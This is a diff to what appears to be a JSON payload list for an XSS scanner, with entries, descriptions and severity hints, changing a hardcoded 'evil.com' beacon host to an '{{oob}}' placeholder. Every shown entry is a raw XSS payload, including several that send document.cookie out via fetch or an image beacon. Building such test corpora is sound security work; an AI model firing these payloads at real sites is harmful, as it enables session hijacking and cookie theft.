@@ -25,7 +25,7 @@
   {"value": "<svg/onload=alert(1)>", "encoding": "raw", "context": "html_body", "targets": ["generic"], "description": "Self-closing SVG onload", "severity_hint": "high"},
   {"value": "<script>fetch('/steal?c='+document.cookie)</script>", "encoding": "raw", "context": "html_body", "targets": ["generic"], "description": "Cookie exfiltration via fetch", "severity_hint": "critical"},
   {"value": "<img src=x onerror=\"fetch('/log?c='+btoa(document.cookie))\">", "encoding": "raw", "context": "html_body", "targets": ["generic"], "description": "Cookie exfil via img onerror", "severity_hint": "critical"},
-  {"value": "<script>new Image().src='//evil.com/'+document.cookie</script>", "encoding": "raw", "context": "html_body", "targets": ["generic"], "description": "Image beacon cookie exfil", "severity_hint": "critical"},
+  {"value": "<script>new Image().src='//{{oob}}/'+document.cookie</script>", "encoding": "raw", "context": "html_body", "targets": ["generic"], "description": "Image beacon cookie exfil", "severity_hint": "critical"},
   {"value": "\"><img src=x onerror=prompt(1)>", "encoding": "raw", "context": "attribute", "targets": ["generic"], "description": "Double-quote breakout img onerror", "severity_hint": "high"},
   {"value": "'><img src=x onerror=alert(1)>", "encoding": "raw", "context": "attribute", "targets": ["generic"], "description": "Single-quote breakout img onerror", "severity_hint": "high"},
   {"value": "</textarea><script>alert(1)</script>", "encoding": "raw", "context": "html_body", "targets": ["generic"], "description": "Textarea close injection", "severity_hint": "high"},
